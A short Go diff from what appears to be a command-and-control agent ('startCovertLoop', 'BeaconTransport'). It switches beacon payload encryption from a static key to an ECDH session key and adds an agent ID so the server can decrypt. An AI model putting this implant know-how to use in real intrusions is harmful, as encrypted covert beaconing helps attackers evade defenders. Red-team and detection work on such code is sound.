@@ -509,22 +509,27 @@ func (a *Agent) startCovertLoop(t BeaconTransport) error {
 
 // ── private helpers ───────────────────────────────────────────────────────────
 
-// marshalPayload JSON-encodes v and encrypts with the static key.
-// Always uses the static key (not the ECDH session key) so the server can
-// decrypt with its CryptoMgr regardless of session state.
+// marshalPayload JSON-encodes v and encrypts with the active key.
+// Uses the ECDH session key when available (post-handshake), otherwise the
+// static key. Includes agent_id in the outer wrapper so the server can look
+// up the right session key for decryption.
 func (a *Agent) marshalPayload(v any) ([]byte, error) {
 	raw, err := json.Marshal(v)
 	if err != nil {
 		return nil, err
 	}
-	if a.crypto == nil {
+	mgr := a.activeCrypto()
+	if mgr == nil {
 		return raw, nil
 	}
-	enc, err := a.crypto.EncryptData(raw)
+	enc, err := mgr.EncryptData(raw)
 	if err != nil {
 		return raw, nil
 	}
-	wrapped, _ := json.Marshal(map[string]string{"encrypted_payload": enc})
+	wrapped, _ := json.Marshal(map[string]string{
+		"encrypted_payload": enc,
+		"agent_id":          a.ID,
+	})
 	return wrapped, nil
 }
 
